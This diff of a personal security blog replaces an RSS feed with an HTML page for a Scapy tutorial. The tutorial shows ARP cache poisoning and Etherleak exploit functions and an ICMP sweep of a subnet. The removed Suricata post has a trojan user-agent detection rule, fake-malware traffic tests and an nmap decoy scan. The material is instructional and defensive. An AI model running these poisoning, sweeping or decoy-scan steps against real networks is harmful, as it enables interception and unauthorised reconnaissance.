@@ -1,33 +1,143 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
-  <channel>
-    <title>M</title>
-    <description>test</description>
-    <link>/</link>
-    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 17 Jan 2017 23:05:33 +0000</pubDate>
-    <lastBuildDate>Tue, 17 Jan 2017 23:05:33 +0000</lastBuildDate>
-    <generator>Jekyll v3.2.0</generator>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en" class="no-js">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
     
-      <item>
-        <title>Scapy</title>
-        <description>&lt;p&gt;&lt;a href=&quot;http://www.secdev.org/projects/scapy/&quot;&gt;Scapy&lt;/a&gt; is a powerful interactive packet manipulation program. It is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more. It can easily handle most classical tasks like scanning, tracerouting, probing, unit tests, attacks or network discovery (it can replace hping, 85% of nmap, arpspoof, arp-sk, arping, tcpdump, tethereal, p0f, etc.). It also performs very well at a lot of other specific tasks that most other tools can’t handle, like sending invalid frames, injecting your own 802.11 frames, combining technics (VLAN hopping+ARP cache poisoning, VOIP decoding on WEP encrypted channel, …), etc.&lt;/p&gt;
+      Scapy &middot; M
+    
+  </title>
 
-&lt;h3 id=&quot;interactive-tutorial&quot;&gt;Interactive tutorial&lt;/h3&gt;
-&lt;p&gt;See interactive tutorial and the quick demo: an interactive session: &lt;a href=&quot;http://www.secdev.org/projects/scapy/doc/usage.html#interactive-tutorial&quot;&gt;http://www.secdev.org/projects/scapy/doc/usage.html#interactive-tutorial&lt;/a&gt;&lt;/p&gt;
+  
+    <meta name="description" content="Scapy notes and examples"/>
+    <meta name="keywords" content="">
+  
+  <meta name="author" content="Heiswayi Nrird">
 
-&lt;h3 id=&quot;command-line&quot;&gt;Command line&lt;/h3&gt;
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@1_mod_m">
+  <meta name="twitter:creator" content="@1_mod_m">
+  
+    <meta name="twitter:title" content="Scapy">
+    <meta name="twitter:description" content="Scapy notes and examples">
+  
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# scapy 
+  <meta property="og:type" content="website"/>
+  
+    <meta property="og:title" content="Scapy"/>
+    <meta property="og:url" content="/Scapy.html"/>
+    <meta property="og:description" content="Scapy notes and examples"/>
+    <meta property="og:site_name" content="Scapy"/>
+  
+
+  <link rel="apple-touch-icon" sizes="57x57" href="/public/icons/apple-icon-57x57.png">
+  <link rel="apple-touch-icon" sizes="60x60" href="/public/icons/apple-icon-60x60.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="/public/icons/apple-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/public/icons/apple-icon-76x76.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="/public/icons/apple-icon-114x114.png">
+  <link rel="apple-touch-icon" sizes="120x120" href="/public/icons/apple-icon-120x120.png">
+  <link rel="apple-touch-icon" sizes="144x144" href="/public/icons/apple-icon-144x144.png">
+  <link rel="apple-touch-icon" sizes="152x152" href="/public/icons/apple-icon-152x152.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="/public/icons/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="192x192" href="/public/icons/android-icon-192x192.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/public/icons/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="96x96" href="/public/icons/favicon-96x96.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/public/icons/favicon-16x16.png">
+  <link rel="manifest" href="/public/icons/manifest.json">
+  <meta name="msapplication-TileColor" content="#f3f3f3">
+  <meta name="msapplication-TileImage" content="/public/icons/ms-icon-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  <meta name="google-site-verification" content="aSavCGGU0uSN5HEHnI7ZiMqVKxn7mfUPCGMVJvmDQ1w" />
+  <meta name="wot-verification" content="6da2597a332a1fadad8f"/>
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/public/css/normalize.css">
+  <link rel="stylesheet" href="/public/css/style.css">
+
+  <script src="/public/js/modernizr.custom.js"></script>
+  <script src="/public/js/jquery-1.11.2.min.js"></script>
+  <script src="/public/js/masonry.pkgd.min.js"></script>
+
+  <!--[if lt IE 9]>
+    <script src="http://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.2/html5shiv.min.js"></script>
+    <script src="http://cdnjs.cloudflare.com/ajax/libs/respond.js/1.1.0/respond.min.js"></script>
+    <script src="/public/js/rem.min.js"></script>
+  <![endif]-->
+</head>
+
+
+  <body>
+
+    <div class="wrap">
+      <div class="master-nav">
+        <div class="nav">
+            <ul class="top-menu">
+              <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
+              <li><a href="/about.html"><i class="fa fa-info-circle"></i> About</a></li>
+              <li><a href="/notes.html"><i class="fa fa-pencil"></i> Posts</a></li>
+              <li><a class="resume" href="https://1modm.github.io/documentation/"><i class="fa fa-file-text-o"></i> Notes</a></li>
+              <li><a class="special" href="https://github.com/1modm?tab=repositories"><i class="fa fa-github-alt"></i> Repositories</a></li>
+
+            </ul>
+        </div>
+      </div>
+
+      <div class="masthead">
+        <div class="container">
+          <h2 class="masthead-title">
+            <a href="/" title="Home">M</a>
+            <small></small>
+          </h2>
+
+          <div class="footer-social-links">
+  <a href="https://www.linkedin.com/in/mmorillo" title="LinkedIn" target="_blank"><i class="fa fa-linkedin"></i></a>
+  <a href="https://twitter.com/1_mod_m" title="Twitter" target="_blank"><i class="fa fa-twitter"></i></a>
+  <a href="https://github.com/1modm" title="GitHub" target="_blank"><i class="fa fa-github-alt"></i></a>
+</div>
+
+
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <div class="post-top-meta">
+    <div class="post-date">January 17, 2017 &middot; <span class="reading-time" title="Estimated Reading Time">
+  
+  
+    11 minutes read
+  
+</span>
+</div>
+    <h1 class="post-title">Scapy</h1>
+  </div>
+
+  <div class="hrline"></div>
+
+  <p><a href="http://www.secdev.org/projects/scapy/">Scapy</a> is a powerful interactive packet manipulation program. It is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more. It can easily handle most classical tasks like scanning, tracerouting, probing, unit tests, attacks or network discovery (it can replace hping, 85% of nmap, arpspoof, arp-sk, arping, tcpdump, tethereal, p0f, etc.). It also performs very well at a lot of other specific tasks that most other tools can’t handle, like sending invalid frames, injecting your own 802.11 frames, combining technics (VLAN hopping+ARP cache poisoning, VOIP decoding on WEP encrypted channel, …), etc.</p>
+
+<h3 id="interactive-tutorial">Interactive tutorial</h3>
+<p>See interactive tutorial and the quick demo: an interactive session: <a href="http://www.secdev.org/projects/scapy/doc/usage.html#interactive-tutorial">http://www.secdev.org/projects/scapy/doc/usage.html#interactive-tutorial</a></p>
+
+<h3 id="command-line">Command line</h3>
+
+<div class="highlighter-rouge"><pre class="highlight"><code># scapy 
 Welcome to Scapy (2.2.0)
-&amp;gt;&amp;gt;&amp;gt; 
+&gt;&gt;&gt; 
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+</code></pre>
+</div>
 
-&lt;p&gt;If we press twice Tab key we will see all the available functions&lt;/p&gt;
+<p>If we press twice Tab key we will see all the available functions</p>
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; 
+<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; 
 Display all 1299 possibilities? (y or n)
 AES                                                IP6ListField                                       TFTP_Options
 ARC2                                               IP6PrefixField                                     TFTP_RRQ
@@ -462,13 +572,13 @@ IFF_UP                                             TFTP_ERROR                   
 IOError                                            TFTP_Error_Codes                                   zerofree_randstring
 IP                                                 TFTP_OACK                                          zip
 IP6Field                                           TFTP_Option                                        zlib
-&amp;gt;&amp;gt;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&gt;&gt;&gt; 
+</code></pre>
+</div>
 
-&lt;h3 id=&quot;help&quot;&gt;Help&lt;/h3&gt;
+<h3 id="help">Help</h3>
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; ls()
+<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; ls()
 ARP        : ARP
 ASN1_Packet : None
 BOOTP      : BOOTP
@@ -477,19 +587,19 @@ DHCP       : DHCP options
 DHCP6      : DHCPv6 Generic Message)
 DHCP6OptAuth : DHCP6 Option - Authentication
 ...
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+</code></pre>
+</div>
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; lsc()
+<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; lsc()
 arpcachepoison      : Poison target's cache with (your MAC,victim's IP) couple
 arping              : Send ARP who-has requests to determine which hosts are up
 bind_layers         : Bind 2 layers on some specific fields' values
 corrupt_bits        : Flip a given percentage or number of bits from a string
 corrupt_bytes       : Corrupt a given percentage or number of bytes from a string
-defrag              : defrag(plist) -&amp;gt; ([not fragmented], [defragmented],
-defragment          : defrag(plist) -&amp;gt; plist defragmented as much as possible 
-dyndns_add          : Send a DNS add message to a nameserver for &quot;name&quot; to have a new &quot;rdata&quot;
-dyndns_del          : Send a DNS delete message to a nameserver for &quot;name&quot;
+defrag              : defrag(plist) -&gt; ([not fragmented], [defragmented],
+defragment          : defrag(plist) -&gt; plist defragmented as much as possible 
+dyndns_add          : Send a DNS add message to a nameserver for "name" to have a new "rdata"
+dyndns_del          : Send a DNS delete message to a nameserver for "name"
 etherleak           : Exploit Etherleak flaw
 fragment            : Fragment a big IP datagram
 fuzz                : Transform a layer into a fuzzy layer by replacing some default values by random objects
@@ -521,605 +631,73 @@ traceroute          : Instant TCP traceroute
 tshark              : Sniff packets and print them calling pkt.show(), a bit like text wireshark
 wireshark           : Run wireshark on a list of packets
 wrpcap              : Write a list of packets to a pcap file
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+</code></pre>
+</div>
 
-&lt;p&gt;If need to know the details for a certain function we can use help()&lt;/p&gt;
+<p>If need to know the details for a certain function we can use help()</p>
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; help(arpcachepoison)
+<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; help(arpcachepoison)
 
 Help on function arpcachepoison in module scapy.layers.l2:
 
 arpcachepoison(target, victim, interval=60)
     Poison target's cache with (your MAC,victim's IP) couple
-    arpcachepoison(target, victim, [interval=60]) -&amp;gt; None
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+    arpcachepoison(target, victim, [interval=60]) -&gt; None
+</code></pre>
+</div>
 
-&lt;h3 id=&quot;packet-manipulation&quot;&gt;Packet manipulation&lt;/h3&gt;
+<h3 id="packet-manipulation">Packet manipulation</h3>
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; packet=IP(dst=&quot;192.168.1.1-254&quot;)/ICMP()
-&amp;gt;&amp;gt;&amp;gt; send(packet)
+<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; packet=IP(dst="192.168.1.1-254")/ICMP()
+&gt;&gt;&gt; send(packet)
 ..............................................................................................................................................................................................................................................................
 Sent 254 packets.
-&amp;gt;&amp;gt;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&gt;&gt;&gt; 
+</code></pre>
+</div>
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; send(IP(dst=&quot;192.168.1.1-254&quot;)/ICMP())
+<div class="highlighter-rouge"><pre class="highlight"><code>&gt;&gt;&gt; send(IP(dst="192.168.1.1-254")/ICMP())
 ..............................................................................................................................................................................................................................................................
 Sent 254 packets.
-&amp;gt;&amp;gt;&amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Tue, 17 Jan 2017 00:00:00 +0000</pubDate>
-        <link>/Scapy.html</link>
-        <guid isPermaLink="true">/Scapy.html</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>Troubleshooting Suricata</title>
-        <description>&lt;p&gt;&lt;a href=&quot;https://suricata-ids.org/&quot;&gt;Suricata&lt;/a&gt; is a free and open source, mature, fast and robust network threat detection engine.&lt;/p&gt;
+&gt;&gt;&gt; 
+</code></pre>
+</div>
 
-&lt;p&gt;The &lt;strong&gt;Suricata&lt;/strong&gt; engine is capable of real time intrusion detection (IDS), inline intrusion prevention (IPS), network security monitoring (NSM) and offline pcap processing.&lt;/p&gt;
+  
+</div>
+<div class="back"><a href="/notes.html"><i class="fa fa-chevron-left"></i> Back</a></div>
 
-&lt;h3 id=&quot;documentation&quot;&gt;Documentation&lt;/h3&gt;
-&lt;p&gt;Once we have Suricata installed and running the best way to check all the available options is to go to the official doc site: &lt;a href=&quot;http://suricata.readthedocs.io/en/latest/&quot;&gt;http://suricata.readthedocs.io/en/latest/&lt;/a&gt;&lt;/p&gt;
+      </div>
+    </div>
 
-&lt;h3 id=&quot;configuration-files&quot;&gt;Configuration files&lt;/h3&gt;
+	  <div class="footer">
+	<div class="hrline"></div>
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/etc/suricata/suricata.yaml
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+	<div class="copyright">Made with <span style="color:#e00"><i class="fa fa-heart"></i></span> using <a href="http://jekyllrb.com">Jekyll</a> &middot; <i class="fa fa-code"></i> on <a href="https://github.com/heiswayi/heiswayi.github.io_jekyll_source">GitHub</a> <i class="fa fa-github-alt"></i><br>&copy; 2017 </div>
+</div>
 
-&lt;p&gt;Remember to set your &lt;strong&gt;$HOMENET&lt;/strong&gt; variable in &lt;strong&gt;/etc/suricata/suricata.yaml&lt;/strong&gt;, any traffic out of the value set in this variable will be ignored also make sure you are logging to &lt;strong&gt;/var/log/suricata&lt;/strong&gt;, and that the directory exists.&lt;/p&gt;
+<script>
+$(window).load(function() {
+	$('.grid').masonry({
+		itemSelector: '.grid-item',
+		columnWidth: '.grid-sizer',
+		gutter: 10
+	});
+});
+</script>
 
-&lt;p&gt;&lt;strong&gt;Configuring Suricata to log to disk&lt;/strong&gt;:
-Configure the &lt;strong&gt;logging outputs&lt;/strong&gt; for Suricata, in &lt;strong&gt;suricata.yaml&lt;/strong&gt; configuration file, enable “file” logging by changing the value of the “enabled” key values set to “yes” from “no”. The config file should look like the following:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  # Define your logging outputs.  If none are defined, or they are all
-  # disabled you will get the default - console output.
-  outputs:
-  - console:
-      enabled: yes
-  - file:
-      enabled: yes
-      filename: /var/log/suricata/suricata.log
-  - syslog:
-      enabled: no
-      facility: local5
-      format: &quot;[%i] &amp;lt;%d&amp;gt; -- &quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+	<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-xxxx', 'auto');
+  ga('send', 'pageview');
+</script>
 
-&lt;p&gt;&lt;strong&gt;Configuring Suricata to enable DNS and TLS logging&lt;/strong&gt;
-In &lt;strong&gt;suricata.yaml&lt;/strong&gt; configuration file ensure that http-log, tls-log and dns-log have the “enabled” key values set to “yes”. When you have completed this step. The config file should look like the following:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  - http-log:
-      enabled: yes
-      filename: http.log
-      append: yes
-      #extended: yes     # enable this for extended logging information
-      #custom: yes       # enabled the custom logging format (defined by customformat)
-      #filetype: regular # 'regular', 'unix_stream' or 'unix_dgram'
 
-  # a line based log of TLS handshake parameters (no alerts)
-  - tls-log:
-      enabled: yes  # Log TLS connections.
-      filename: tls.log # File to store TLS logs.
-      append: yes
-      #filetype: regular # 'regular', 'unix_stream' or 'unix_dgram'
-      #extended: yes # Log extended information like fingerprint
-      certs-log-dir: certs # directory to store the certificates files
 
-  # a line based log of DNS requests and/or replies (no alerts)
-  - dns-log:
-      enabled: yes
-      filename: dns.log
-      append: yes
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;log-files&quot;&gt;Log files&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/var/log/suricata/suricata-start.log
-/var/log/suricata/suricata.log
-/var/log/suricata/stats.log
-/var/log/suricata/core/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The folder &lt;strong&gt;/var/log/suricata/core/&lt;/strong&gt; will contain any core dumps in case of a segfault. 
-Further reading on what to do and &lt;a href=&quot;https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Reporting_Bugs&quot;&gt;how to report Suricata bugs&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Check drops in stats.log file:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tail -f /var/log/suricata/stats.log | grep -i capture.kernel_drops
-tail -f /var/log/suricata/stats.log | grep -i drop
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;manual-start&quot;&gt;Manual start&lt;/h3&gt;
-
-&lt;p&gt;Run the command with the &lt;strong&gt;–init-errors-fatal&lt;/strong&gt; option at first to see if there are any issues.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/suricata -c /etc/suricata/suricata.yaml -i eth0 --init-errors-fatal
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;-D&lt;/strong&gt; option to run in daemon mode and &lt;strong&gt;–pfring&lt;/strong&gt; option. PF_RING is a new type of network socket that dramatically improves the packet capture speed, and is available for Linux kernels 2.6.32 and newer.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/suricata -c /etc/suricata/suricata.yaml --pidfile /var/run/suricata.pid -D --pfring=eth0
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Manually start in debug mode:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/bin/suricata -c /etc/suricata/suricata.yaml --pidfile /var/run/suricata.pid -D --pfring=eth0 --enable-debug
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;run-in-pcap-offline-mode&quot;&gt;Run in pcap offline mode&lt;/h3&gt;
-
-&lt;p&gt;Reading files from pcap file:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;suricata -r &amp;lt;PCAP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;threads-used-by-suricata&quot;&gt;Threads used by Suricata&lt;/h3&gt;
-
-&lt;p&gt;Using &lt;code class=&quot;highlighter-rouge&quot;&gt;top&lt;/code&gt; to see if the individual af_packet threads&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;Enter &lt;code class=&quot;highlighter-rouge&quot;&gt;top -H&lt;/code&gt; to view threads in top&lt;/li&gt;
-  &lt;li&gt;Press &lt;code class=&quot;highlighter-rouge&quot;&gt;o&lt;/code&gt; to add a filter&lt;/li&gt;
-  &lt;li&gt;Enter &lt;code class=&quot;highlighter-rouge&quot;&gt;COMMAND=AFPacket&lt;/code&gt; then press Enter key&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&quot;testing-suricata&quot;&gt;Testing Suricata&lt;/h3&gt;
-
-&lt;p&gt;1- Check that you have enable the next rule in /etc/suricata/rules/emerging-user_agents.rules&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert http $HOME_NET any -&amp;gt; $EXTERNAL_NET any (msg:&quot;ET USER_AGENTS Suspicious User Agent (BlackSun)&quot;; flow:to_server,established; content:&quot;User-Agent|3a| BlackSun&quot;; nocase; http_header; reference:url,www.bitdefender.com/VIRUS-1000328-en--Trojan.Pws.Wow.NCY.html; reference:url,doc.emergingthreats.net/bin/view/Main/2008983; classtype:trojan-activity; sid:2008983; rev:6;)
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;2- Issue traffic to google.com using the user-agent string “BlackSun”&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# apt-get install curl
-# curl -A &quot;BlackSun&quot; www.google.com
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;3- Generate fake malware traffic&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wget testmyids.com 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;4- Create a fake scan to generate port scan traffic&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sS &amp;lt;NETWORK INTERNAL HOST IP&amp;gt; -D 118.186.71.134
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h3 id=&quot;tools&quot;&gt;Tools&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/jasonish/py-idstools&quot;&gt;py-idstools&lt;/a&gt;: Snort and Suricata Rule and Event Utilities in Python (Including an easy to use Unified2 File Reader)&lt;/p&gt;
-
-&lt;p&gt;Check the documentation for further analysis: &lt;a href=&quot;https://idstools.readthedocs.io&quot;&gt;https://idstools.readthedocs.io&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;With &lt;a href=&quot;https://idstools.readthedocs.io/en/latest/tools/u2json.html&quot;&gt;u2json&lt;/a&gt; you can read the alerts generated and convert to JSON, for example:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;idstools-u2json /var/log/suricata/unified2.alert.1473071280
-
-idstools-u2json --snort-conf /etc/suricata/suricata.yaml --directory /var/log/suricata  --prefix unified2.alert  --follow  --delete --output /tmp/alerts.json 
-
-idstools-u2json --snort-conf /etc/suricata/suricata.yaml --directory /var/log/suricata  --prefix unified2.alert  --follow  --output /tmp/alerts.json 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The next example will read the &lt;strong&gt;unified2.alert&lt;/strong&gt; files generated by Suricata and will print the output of every alert/event:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# -*- coding: UTF-8 -*-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;idstools&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unified2&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;# Event Reader&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unified2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SpoolEventReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/var/log/suricata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;unified2.alert&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;follow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Output&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;event&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Fri, 06 Jan 2017 00:00:00 +0000</pubDate>
-        <link>/Troubleshooting_with_Suricata.html</link>
-        <guid isPermaLink="true">/Troubleshooting_with_Suricata.html</guid>
-        
-        
-      </item>
-    
-      <item>
-        <title>SIP and RTP decoders for Dshell</title>
-        <description>&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: 
-This pull request has been approved. &lt;a href=&quot;https://github.com/USArmyResearchLab/Dshell/pull/93&quot;&gt;Merged #93&lt;/a&gt;. The decoders for SIP and RTP are now merged to Dshell. Thanks to USArmyResearchLab and dev195!&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://github.com/USArmyResearchLab/Dshell&quot;&gt;Dshell&lt;/a&gt; is an extensible network forensic analysis framework and enables rapid development of plugins to support the dissection of network packet captures.&lt;/p&gt;
-
-&lt;p&gt;While I was testing some VoIP packets, I discover that doesn’t exist VoIP specific decoders, so I created the first one to detect SIP Request and Response packets, and a second decoder to extract all the information for RTP packets used in a VoIP communication.&lt;/p&gt;
-
-&lt;h3 id=&quot;screenshot&quot;&gt;Screenshot&lt;/h3&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/j0bfx1v.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;sip-decoder&quot;&gt;SIP decoder&lt;/h3&gt;
-
-&lt;p&gt;SIP &lt;a href=&quot;https://www.ietf.org/rfc/rfc3261.txt&quot;&gt;RFC 3261&lt;/a&gt; indicate that SIP is a text-based protocol with syntax similar to that of HTTP. There are two different types of SIP messages:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Requests initiate a SIP transaction between two SIP entities for establishing, controlling, and terminating sessions.&lt;/li&gt;
-  &lt;li&gt;Responses are send by the user agent server indicating the result of a received request.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;A SIP session setup example can be similar to this one:&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;       Alice's  . . . . . . . . . . . . . . . . . . . .  Bob's
-      softphone                                        SIP Phone
-         |                |                |                |
-         |    INVITE F1   |                |                |
-         |---------------&amp;gt;|    INVITE F2   |                |
-         |  100 Trying F3 |---------------&amp;gt;|    INVITE F4   |
-         |&amp;lt;---------------|  100 Trying F5 |---------------&amp;gt;|
-         |                |&amp;lt;-------------- | 180 Ringing F6 |
-         |                | 180 Ringing F7 |&amp;lt;---------------|
-         | 180 Ringing F8 |&amp;lt;---------------|     200 OK F9  |
-         |&amp;lt;---------------|    200 OK F10  |&amp;lt;---------------|
-         |    200 OK F11  |&amp;lt;---------------|                |
-         |&amp;lt;---------------|                |                |
